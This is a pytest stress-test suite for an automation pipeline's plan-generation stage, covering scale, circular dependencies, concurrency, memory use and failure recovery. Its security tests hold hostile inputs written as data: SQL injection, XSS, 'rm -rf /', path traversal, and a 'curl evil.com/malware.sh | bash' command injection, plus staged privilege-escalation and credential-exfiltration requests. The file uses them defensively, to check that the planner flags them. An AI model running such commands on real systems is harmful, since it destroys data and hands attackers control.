"""
Comprehensive Stress Tests for Phase 3: Stage C Planner

This test suite is designed to break the Phase 3 implementation and expose
real-world limitations, edge cases, and failure modes that the basic tests miss.

These tests simulate:
- Complex real-world scenarios
- Malformed and adversarial inputs
- Resource constraints and limits
- Concurrent access patterns
- Error propagation and recovery
- Performance under stress
- Security boundary testing
"""

import pytest
import asyncio
import threading
import time
import json
from datetime import datetime, timedelta
from typing import Dict, Any, List
from unittest.mock import patch, MagicMock

# Import schemas
from pipeline.schemas.decision_v1 import DecisionV1, IntentV1, EntityV1, RiskLevel
from pipeline.schemas.selection_v1 import SelectionV1, SelectedTool, ExecutionPolicy
from pipeline.schemas.plan_v1 import (
    PlanV1, ExecutionPlan, ExecutionStep, SafetyCheck, RollbackStep, 
    ObservabilityConfig, ExecutionMetadata, SafetyStage, FailureAction
)

# Import Stage C components
from pipeline.stages.stage_c.planner import StageCPlanner, PlanningError
from pipeline.stages.stage_c.step_generator import StepGenerator
from pipeline.stages.stage_c.dependency_resolver import DependencyResolver, DependencyError
from pipeline.stages.stage_c.safety_planner import SafetyPlanner
from pipeline.stages.stage_c.resource_planner import ResourcePlanner


class TestRealWorldComplexity:
    """Test complex real-world scenarios that could break the system"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.planner = StageCPlanner()
        self.step_generator = StepGenerator()
        self.dependency_resolver = DependencyResolver()
        self.safety_planner = SafetyPlanner()
        self.resource_planner = ResourcePlanner()
    
    def test_massive_microservices_deployment(self):
        """Test planning for a complex microservices deployment with 50+ services"""
        # Create a decision for deploying a complex microservices architecture
        decision = DecisionV1(
            decision_id="deploy_microservices_001",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="deploy_services", action="deploy_microservices_stack", confidence=0.85),
            entities=[
                EntityV1(type="service_name", value=f"service-{i}", confidence=0.9) 
                for i in range(50)  # 50 microservices
            ] + [
                EntityV1(type="database", value="postgres-cluster", confidence=0.9),
                EntityV1(type="database", value="redis-cluster", confidence=0.8),
                EntityV1(type="load_balancer", value="nginx-ingress", confidence=0.9),
                EntityV1(type="monitoring", value="prometheus-stack", confidence=0.8),
            ],
            overall_confidence=0.75,
            confidence_level="medium",
            risk_level=RiskLevel.HIGH,
            original_request="Deploy complete microservices architecture with 50 services, databases, monitoring",
            next_stage="stage_b",
            processing_time_ms=500
        )
        
        # Create selection with complex tool dependencies
        tools = []
        for i in range(50):
            tools.append(SelectedTool(
                tool_name="docker",
                justification=f"Deploy service-{i}",
                execution_order=i + 10,  # Start after infrastructure
                depends_on=["postgres-cluster", "redis-cluster"] if i > 0 else []
            ))
        
        # Add infrastructure tools
        infrastructure_tools = [
            SelectedTool(tool_name="docker", justification="Deploy postgres cluster", execution_order=1),
            SelectedTool(tool_name="docker", justification="Deploy redis cluster", execution_order=2),
            SelectedTool(tool_name="config_manager", justification="Configure load balancer", execution_order=3),
            SelectedTool(tool_name="network_tools", justification="Setup networking", execution_order=4),
            SelectedTool(tool_name="monitoring_tools", justification="Deploy monitoring", execution_order=5),
        ]
        
        selection = SelectionV1(
            selection_id="microservices_selection_001",
            decision_id="deploy_microservices_001",
            selected_tools=infrastructure_tools + tools,
            policy=ExecutionPolicy(
                risk_level=RiskLevel.HIGH,
                requires_approval=True,
                max_execution_time=3600,  # 1 hour
                parallel_execution=True
            ),
            environment_requirements={
                "production_safe": True,
                "min_memory_mb": 32000,  # 32GB
                "min_disk_gb": 500,      # 500GB
                "min_cpu_cores": 16
            },
            total_tools=55,
            selection_confidence=0.8,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=800
        )
        
        # This should stress-test the system significantly
        start_time = time.time()
        plan = self.planner.create_plan(decision, selection)
        end_time = time.time()
        
        # Validate the plan can handle this complexity
        assert isinstance(plan, PlanV1)
        assert len(plan.plan.steps) == 55
        assert len(plan.plan.safety_checks) > 20  # Should have many safety checks
        assert len(plan.plan.rollback_plan) > 10   # Should have comprehensive rollback
        assert plan.execution_metadata.total_estimated_time > 1800  # Should take significant time
        
        # Performance should still be reasonable (under 5 seconds for planning)
        planning_time = (end_time - start_time) * 1000
        assert planning_time < 5000, f"Planning took too long: {planning_time}ms"
        
        # Validate dependency resolution worked
        step_ids = [step.id for step in plan.plan.steps]
        assert len(step_ids) == len(set(step_ids))  # All unique IDs
    
    def test_circular_dependency_hell(self):
        """Test complex circular dependencies that should break dependency resolution"""
        # Create a nightmare scenario with multiple circular dependency chains
        circular_steps = []
        
        # Create 3 circular dependency chains
        for chain in range(3):
            for i in range(5):  # 5 steps per chain
                step_id = f"chain_{chain}_step_{i}"
                next_step = f"chain_{chain}_step_{(i + 1) % 5}"  # Circular reference
                
                step = ExecutionStep(
                    id=step_id,
                    description=f"Step {i} in chain {chain}",
                    tool="systemctl",
                    estimated_duration=10,
                    failure_handling="Abort",
                    depends_on=[next_step] if i < 4 else [f"chain_{chain}_step_0"]  # Close the circle
                )
                circular_steps.append(step)
        
        # Add inter-chain dependencies to make it even worse
        circular_steps[0].depends_on.append("chain_1_step_2")  # Chain 0 depends on Chain 1
        circular_steps[5].depends_on.append("chain_2_step_3")  # Chain 1 depends on Chain 2
        circular_steps[10].depends_on.append("chain_0_step_1") # Chain 2 depends on Chain 0
        
        # This should definitely fail
        with pytest.raises(DependencyError) as exc_info:
            self.dependency_resolver.resolve_dependencies(circular_steps)
        
        assert "circular" in str(exc_info.value).lower()
    
    def test_resource_exhaustion_scenario(self):
        """Test planning under extreme resource constraints"""
        decision = DecisionV1(
            decision_id="resource_exhaustion_001",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="system_maintenance", action="full_system_rebuild", confidence=0.9),
            entities=[
                EntityV1(type="system", value="production-cluster", confidence=0.95),
                EntityV1(type="database", value="primary-db", confidence=0.9),
                EntityV1(type="storage", value="distributed-storage", confidence=0.8),
            ],
            overall_confidence=0.85,
            confidence_level="high",
            risk_level=RiskLevel.CRITICAL,
            original_request="Rebuild entire production system with zero downtime",
            next_stage="stage_b",
            processing_time_ms=200
        )
        
        # Create selection with impossible resource requirements
        selection = SelectionV1(
            selection_id="resource_exhaustion_selection",
            decision_id="resource_exhaustion_001",
            selected_tools=[
                SelectedTool(tool_name="docker", justification="Rebuild containers", execution_order=1),
                SelectedTool(tool_name="database_tools", justification="Migrate database", execution_order=2),
                SelectedTool(tool_name="storage_tools", justification="Rebuild storage", execution_order=3),
                SelectedTool(tool_name="network_tools", justification="Reconfigure network", execution_order=4),
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.CRITICAL,
                requires_approval=True,
                max_execution_time=86400,  # 24 hours
                parallel_execution=False   # Sequential for safety
            ),
            environment_requirements={
                "production_safe": True,
                "min_memory_mb": 1000000,  # 1TB RAM (impossible)
                "min_disk_gb": 100000,     # 100TB disk (extreme)
                "min_cpu_cores": 1000,     # 1000 cores (impossible)
                "network_bandwidth_gbps": 100,
                "zero_downtime_required": True
            },
            total_tools=4,
            selection_confidence=0.7,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=300
        )
        
        # The planner should handle this gracefully, not crash
        plan = self.planner.create_plan(decision, selection)
        
        assert isinstance(plan, PlanV1)
        # Should have extensive safety checks for such a risky operation
        assert len(plan.plan.safety_checks) > 15
        # Should have detailed rollback plan
        assert len(plan.plan.rollback_plan) > 8
        # Should flag resource constraints as risk factors
        assert any("resource" in factor.lower() for factor in plan.execution_metadata.risk_factors)
        # Should require multiple approval points
        assert len(plan.execution_metadata.approval_points) > 3
    
    def test_malformed_input_injection(self):
        """Test handling of malformed and potentially malicious inputs"""
        # Create decision with malformed/malicious data
        malicious_decision = DecisionV1(
            decision_id="'; DROP TABLE plans; --",  # SQL injection attempt
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(
                category="<script>alert('xss')</script>",  # XSS attempt
                action="rm -rf / --no-preserve-root",      # Dangerous command
                confidence=0.9
            ),
            entities=[
                EntityV1(
                    type="file_path", 
                    value="../../../etc/passwd",  # Path traversal
                    confidence=0.9
                ),
                EntityV1(
                    type="command",
                    value="$(curl evil.com/malware.sh | bash)",  # Command injection
                    confidence=0.8
                )
            ],
            overall_confidence=0.8,
            confidence_level="high",
            risk_level=RiskLevel.LOW,  # Trying to disguise as low risk
            original_request="Just a simple system check :)",
            next_stage="stage_b",
            processing_time_ms=100
        )
        
        malicious_selection = SelectionV1(
            selection_id="malicious_selection",
            decision_id="'; DROP TABLE plans; --",
            selected_tools=[
                SelectedTool(
                    tool_name="file_manager",
                    justification="Access sensitive files",
                    execution_order=1
                ),
                SelectedTool(
                    tool_name="shell_executor",  # Dangerous tool
                    justification="Execute system commands",
                    execution_order=2
                )
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.LOW,  # Lying about risk
                requires_approval=False,   # Trying to bypass approval
                max_execution_time=1
            ),
            environment_requirements={
                "production_safe": True,  # Claiming to be safe
                "bypass_security": True,  # Malicious requirement
            },
            total_tools=2,
            selection_confidence=0.9,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=50
        )
        
        # The system should handle this gracefully and apply safety measures
        plan = self.planner.create_plan(malicious_decision, malicious_selection)
        
        assert isinstance(plan, PlanV1)
        # Should detect the high risk despite the low risk claim
        assert plan.execution_metadata.total_estimated_time > 60  # Should add safety time
        # Should have extensive safety checks
        assert len(plan.plan.safety_checks) > 10
        # Should require approval despite the request not to
        assert len(plan.execution_metadata.approval_points) > 0
        # Should flag security concerns
        assert any("security" in factor.lower() or "malicious" in factor.lower() 
                  for factor in plan.execution_metadata.risk_factors)


class TestConcurrencyAndRaceConditions:
    """Test concurrent access patterns and race conditions"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.planner = StageCPlanner()
    
    def test_concurrent_plan_creation_race_conditions(self):
        """Test race conditions in concurrent plan creation"""
        decision = DecisionV1(
            decision_id="concurrent_test",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="monitor_system", action="check_status", confidence=0.9),
            entities=[],
            overall_confidence=0.8,
            confidence_level="high",
            risk_level=RiskLevel.MEDIUM,
            original_request="concurrent test",
            next_stage="stage_b",
            processing_time_ms=100
        )
        
        selection = SelectionV1(
            selection_id="concurrent_selection",
            decision_id="concurrent_test",
            selected_tools=[
                SelectedTool(tool_name="ps", justification="List processes", execution_order=1),
                SelectedTool(tool_name="systemctl", justification="Check services", execution_order=2),
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.MEDIUM,
                requires_approval=False,
                max_execution_time=60
            ),
            environment_requirements={},
            total_tools=2,
            selection_confidence=0.8,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=100
        )
        
        results = []
        errors = []
        
        def create_plan_with_modifications():
            """Create plan while modifying shared state"""
            try:
                # Simulate concurrent modifications to the planner state
                self.planner.stats["concurrent_test"] = threading.current_thread().ident
                plan = self.planner.create_plan(decision, selection)
                results.append(plan)
            except Exception as e:
                errors.append(e)
        
        # Create 20 concurrent threads to stress-test race conditions
        threads = []
        for i in range(20):
            thread = threading.Thread(target=create_plan_with_modifications)
            threads.append(thread)
        
        # Start all threads simultaneously
        for thread in threads:
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join(timeout=10)  # 10 second timeout
        
        # Validate results
        assert len(errors) == 0, f"Errors occurred: {errors}"
        assert len(results) == 20, f"Expected 20 results, got {len(results)}"
        
        # All plans should be valid
        for plan in results:
            assert isinstance(plan, PlanV1)
            assert len(plan.plan.steps) > 0
        
        # Check for data corruption in concurrent access
        plan_ids = [plan.plan.steps[0].id for plan in results]
        assert len(plan_ids) == len(set(plan_ids)), "Step IDs should be unique across concurrent plans"
    
    def test_memory_leak_under_stress(self):
        """Test for memory leaks under repeated plan creation"""
        import gc
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        decision = DecisionV1(
            decision_id="memory_test",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="monitor_system", action="check_status", confidence=0.9),
            entities=[EntityV1(type="service", value=f"service-{i}", confidence=0.9) for i in range(10)],
            overall_confidence=0.8,
            confidence_level="high",
            risk_level=RiskLevel.LOW,
            original_request="memory leak test",
            next_stage="stage_b",
            processing_time_ms=100
        )
        
        selection = SelectionV1(
            selection_id="memory_selection",
            decision_id="memory_test",
            selected_tools=[
                SelectedTool(tool_name="ps", justification="List processes", execution_order=1),
                SelectedTool(tool_name="systemctl", justification="Check services", execution_order=2),
                SelectedTool(tool_name="docker", justification="Check containers", execution_order=3),
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.LOW,
                requires_approval=False,
                max_execution_time=60
            ),
            environment_requirements={},
            total_tools=3,
            selection_confidence=0.8,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=100
        )
        
        # Create 1000 plans to test for memory leaks
        plans = []
        for i in range(1000):
            plan = self.planner.create_plan(decision, selection)
            plans.append(plan)
            
            # Force garbage collection every 100 iterations
            if i % 100 == 0:
                gc.collect()
        
        # Check final memory usage
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        memory_increase_mb = memory_increase / (1024 * 1024)
        
        # Memory increase should be reasonable (less than 100MB for 1000 plans)
        assert memory_increase_mb < 100, f"Memory increased by {memory_increase_mb:.2f}MB - possible memory leak"
        
        # All plans should still be valid
        assert len(plans) == 1000
        assert all(isinstance(plan, PlanV1) for plan in plans)


class TestErrorPropagationAndRecovery:
    """Test error propagation and recovery mechanisms"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.planner = StageCPlanner()
    
    def test_cascading_failure_recovery(self):
        """Test recovery from cascading component failures"""
        decision = DecisionV1(
            decision_id="cascading_failure_test",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="system_recovery", action="recover_from_failure", confidence=0.8),
            entities=[],
            overall_confidence=0.7,
            confidence_level="medium",
            risk_level=RiskLevel.HIGH,
            original_request="recover from cascading system failure",
            next_stage="stage_b",
            processing_time_ms=200
        )
        
        selection = SelectionV1(
            selection_id="cascading_failure_selection",
            decision_id="cascading_failure_test",
            selected_tools=[
                SelectedTool(tool_name="systemctl", justification="Restart services", execution_order=1),
                SelectedTool(tool_name="docker", justification="Restart containers", execution_order=2),
                SelectedTool(tool_name="network_tools", justification="Fix network", execution_order=3),
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.HIGH,
                requires_approval=True,
                max_execution_time=300
            ),
            environment_requirements={},
            total_tools=3,
            selection_confidence=0.7,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=150
        )
        
        # Mock component failures
        with patch.object(self.planner.step_generator, 'generate_steps') as mock_step_gen:
            # First call fails, second succeeds (recovery)
            mock_step_gen.side_effect = [
                Exception("Step generation failed"),
                [ExecutionStep(
                    id="fallback_step_001",
                    description="Fallback step",
                    tool="ps",
                    estimated_duration=30,
                    failure_handling="Continue"
                )]
            ]
            
            # Should recover and create a fallback plan
            plan = self.planner.create_plan(decision, selection)
            
            assert isinstance(plan, PlanV1)
            assert len(plan.plan.steps) > 0
            assert "fallback" in plan.execution_metadata.risk_factors
            # Should have been called twice (failure + recovery)
            assert mock_step_gen.call_count == 2
    
    def test_partial_component_failure(self):
        """Test handling when some components fail but others succeed"""
        decision = DecisionV1(
            decision_id="partial_failure_test",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="system_check", action="comprehensive_check", confidence=0.9),
            entities=[],
            overall_confidence=0.8,
            confidence_level="high",
            risk_level=RiskLevel.MEDIUM,
            original_request="comprehensive system check",
            next_stage="stage_b",
            processing_time_ms=100
        )
        
        selection = SelectionV1(
            selection_id="partial_failure_selection",
            decision_id="partial_failure_test",
            selected_tools=[
                SelectedTool(tool_name="systemctl", justification="Check services", execution_order=1),
                SelectedTool(tool_name="ps", justification="List processes", execution_order=2),
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.MEDIUM,
                requires_approval=False,
                max_execution_time=60
            ),
            environment_requirements={},
            total_tools=2,
            selection_confidence=0.8,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=100
        )
        
        # Mock safety planner failure but other components succeed
        with patch.object(self.planner.safety_planner, 'create_safety_plan') as mock_safety:
            mock_safety.side_effect = Exception("Safety planning failed")
            
            # Should still create a plan with fallback safety measures
            plan = self.planner.create_plan(decision, selection)
            
            assert isinstance(plan, PlanV1)
            assert len(plan.plan.steps) > 0
            # Should have fallback safety checks
            assert len(plan.plan.safety_checks) > 0
            # Should flag the safety planning failure
            assert any("safety" in factor.lower() for factor in plan.execution_metadata.risk_factors)


class TestSecurityBoundaryTesting:
    """Test security boundaries and potential attack vectors"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.planner = StageCPlanner()
    
    def test_privilege_escalation_detection(self):
        """Test detection of potential privilege escalation attempts"""
        decision = DecisionV1(
            decision_id="privilege_escalation_test",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="system_admin", action="gain_root_access", confidence=0.9),
            entities=[
                EntityV1(type="user", value="root", confidence=0.9),
                EntityV1(type="command", value="sudo su -", confidence=0.8),
                EntityV1(type="file", value="/etc/sudoers", confidence=0.9),
            ],
            overall_confidence=0.8,
            confidence_level="high",
            risk_level=RiskLevel.LOW,  # Trying to disguise as low risk
            original_request="I need to check system configuration files",
            next_stage="stage_b",
            processing_time_ms=100
        )
        
        selection = SelectionV1(
            selection_id="privilege_escalation_selection",
            decision_id="privilege_escalation_test",
            selected_tools=[
                SelectedTool(tool_name="file_manager", justification="Access system files", execution_order=1),
                SelectedTool(tool_name="user_manager", justification="Modify user permissions", execution_order=2),
                SelectedTool(tool_name="shell_executor", justification="Execute admin commands", execution_order=3),
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.LOW,  # Lying about risk level
                requires_approval=False,   # Trying to bypass approval
                max_execution_time=30
            ),
            environment_requirements={
                "production_safe": True,
                "requires_root": True,     # Red flag
                "bypass_audit": True,      # Another red flag
            },
            total_tools=3,
            selection_confidence=0.9,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=100
        )
        
        plan = self.planner.create_plan(decision, selection)
        
        assert isinstance(plan, PlanV1)
        # Should detect privilege escalation attempt and upgrade security
        assert len(plan.plan.safety_checks) > 15  # Extensive safety checks
        assert len(plan.execution_metadata.approval_points) > 2  # Multiple approvals required
        # Should flag security concerns
        assert any("privilege" in factor.lower() or "security" in factor.lower() 
                  for factor in plan.execution_metadata.risk_factors)
        # Should have comprehensive rollback plan
        assert len(plan.plan.rollback_plan) > 5
    
    def test_data_exfiltration_detection(self):
        """Test detection of potential data exfiltration attempts"""
        decision = DecisionV1(
            decision_id="data_exfiltration_test",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="data_backup", action="backup_sensitive_data", confidence=0.9),
            entities=[
                EntityV1(type="file_path", value="/etc/passwd", confidence=0.9),
                EntityV1(type="file_path", value="/etc/shadow", confidence=0.8),
                EntityV1(type="database", value="user_credentials", confidence=0.9),
                EntityV1(type="network", value="external_server", confidence=0.7),
            ],
            overall_confidence=0.8,
            confidence_level="high",
            risk_level=RiskLevel.LOW,
            original_request="backup important system files to external location",
            next_stage="stage_b",
            processing_time_ms=100
        )
        
        selection = SelectionV1(
            selection_id="data_exfiltration_selection",
            decision_id="data_exfiltration_test",
            selected_tools=[
                SelectedTool(tool_name="file_manager", justification="Access sensitive files", execution_order=1),
                SelectedTool(tool_name="database_tools", justification="Export database", execution_order=2),
                SelectedTool(tool_name="network_tools", justification="Transfer to external server", execution_order=3),
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.LOW,
                requires_approval=False,
                max_execution_time=60
            ),
            environment_requirements={
                "production_safe": True,
                "external_network_access": True,  # Red flag
                "encryption_disabled": True,      # Another red flag
            },
            total_tools=3,
            selection_confidence=0.8,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=100
        )
        
        plan = self.planner.create_plan(decision, selection)
        
        assert isinstance(plan, PlanV1)
        # Should detect potential data exfiltration and add protections
        assert len(plan.plan.safety_checks) > 10
        # Should require approval for sensitive data access
        assert len(plan.execution_metadata.approval_points) > 1
        # Should flag data security concerns
        assert any("data" in factor.lower() or "exfiltration" in factor.lower() or "security" in factor.lower()
                  for factor in plan.execution_metadata.risk_factors)


class TestPerformanceLimits:
    """Test performance limits and degradation patterns"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.planner = StageCPlanner()
    
    def test_planning_timeout_handling(self):
        """Test handling of planning operations that take too long"""
        # Create an extremely complex scenario that might timeout
        decision = DecisionV1(
            decision_id="timeout_test",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="complex_operation", action="massive_system_overhaul", confidence=0.8),
            entities=[
                EntityV1(type="service", value=f"service-{i}", confidence=0.9) 
                for i in range(200)  # 200 services
            ],
            overall_confidence=0.7,
            confidence_level="medium",
            risk_level=RiskLevel.HIGH,
            original_request="overhaul entire system with 200 services",
            next_stage="stage_b",
            processing_time_ms=1000
        )
        
        # Create selection with complex interdependencies
        tools = []
        for i in range(200):
            depends_on = [f"service-{j}" for j in range(max(0, i-5), i)]  # Each depends on previous 5
            tools.append(SelectedTool(
                tool_name="systemctl",
                justification=f"Handle service-{i}",
                execution_order=i + 1,
                depends_on=depends_on
            ))
        
        selection = SelectionV1(
            selection_id="timeout_selection",
            decision_id="timeout_test",
            selected_tools=tools,
            policy=ExecutionPolicy(
                risk_level=RiskLevel.HIGH,
                requires_approval=True,
                max_execution_time=7200  # 2 hours
            ),
            environment_requirements={},
            total_tools=200,
            selection_confidence=0.7,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=500
        )
        
        # Test with timeout
        start_time = time.time()
        plan = self.planner.create_plan(decision, selection)
        end_time = time.time()
        
        planning_time = (end_time - start_time) * 1000
        
        # Should complete within reasonable time even for complex scenarios
        assert planning_time < 10000, f"Planning took too long: {planning_time}ms"
        assert isinstance(plan, PlanV1)
        assert len(plan.plan.steps) > 0
    
    def test_memory_pressure_handling(self):
        """Test behavior under memory pressure"""
        # Create scenario that uses significant memory
        large_entities = [
            EntityV1(
                type="large_data",
                value="x" * 10000,  # 10KB per entity
                confidence=0.9
            ) for _ in range(1000)  # 10MB of entity data
        ]
        
        decision = DecisionV1(
            decision_id="memory_pressure_test",
            decision_type="action",
            timestamp=datetime.now().isoformat(),
            intent=IntentV1(category="data_processing", action="process_large_dataset", confidence=0.8),
            entities=large_entities,
            overall_confidence=0.8,
            confidence_level="high",
            risk_level=RiskLevel.MEDIUM,
            original_request="process large dataset with 1000 entities",
            next_stage="stage_b",
            processing_time_ms=200
        )
        
        selection = SelectionV1(
            selection_id="memory_pressure_selection",
            decision_id="memory_pressure_test",
            selected_tools=[
                SelectedTool(tool_name="data_processor", justification="Process data", execution_order=1),
            ],
            policy=ExecutionPolicy(
                risk_level=RiskLevel.MEDIUM,
                requires_approval=False,
                max_execution_time=300
            ),
            environment_requirements={
                "min_memory_mb": 1000000,  # 1TB - impossible requirement
            },
            total_tools=1,
            selection_confidence=0.8,
            next_stage="stage_c",
            timestamp=datetime.now().isoformat(),
            processing_time_ms=100
        )
        
        # Should handle gracefully despite memory pressure
        plan = self.planner.create_plan(decision, selection)
        
        assert isinstance(plan, PlanV1)
        assert len(plan.plan.steps) > 0
        # Should flag memory constraints
        assert any("memory" in factor.lower() or "resource" in factor.lower()
                  for factor in plan.execution_metadata.risk_factors)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])